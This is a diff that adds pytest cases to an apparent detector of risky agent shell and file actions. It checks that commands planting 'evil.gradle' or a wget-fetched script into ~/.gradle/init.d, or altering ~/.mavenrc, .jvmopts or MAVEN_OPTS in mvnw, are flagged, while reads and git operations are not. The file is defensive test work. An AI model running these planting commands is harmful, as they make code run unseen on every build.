@@ -220,3 +220,34 @@ def test_round2_edit_and_padding_and_carriers():
 ])
 def test_round2_benign(ev):
     assert not _fires(ev)
+
+
+@pytest.mark.parametrize("cmd", [
+    "cp evil.gradle ~/.gradle/init.d/",
+    "cp evil.gradle ~/.gradle/init.d",
+    "mv evil.gradle ~/.gradle/init.d/",
+    "install -t ~/.gradle/init.d evil.gradle",
+    "cp -t ~/.gradle/init.d evil.gradle",
+    "unzip x.zip -d ~/.gradle/init.d",
+    "git clone https://x/y ~/.gradle/init.d",
+    "wget -P ~/.gradle/init.d https://x/e.gradle",
+    "cp init.gradle ~/.gradle/",
+    "cp /tmp/x ~/.mavenrc",
+    "cp /tmp/x .jvmopts",
+])
+def test_round3_shell_gated(cmd):
+    assert _fires(_shell(cmd)), cmd
+
+
+def test_round3_benign_and_mvnw():
+    assert not _fires(_shell("ls ~/.gradle/init.d"))
+    assert not _fires(_shell("cat ~/.gradle/init.d/a.gradle"))
+    assert _fires(_write("proj/mvnw", f"export MAVEN_OPTS={AGENT}"))
+
+
+@pytest.mark.parametrize("cmd", [
+    "git add .mvn/jvm.config", "git commit -m x .mvn/extensions.xml",
+    "git checkout -- .mvn/jvm.config", "git diff .mvn/extensions.xml",
+])
+def test_git_ops_on_jvm_files_not_gated(cmd):
+    assert not _fires(_shell(cmd))
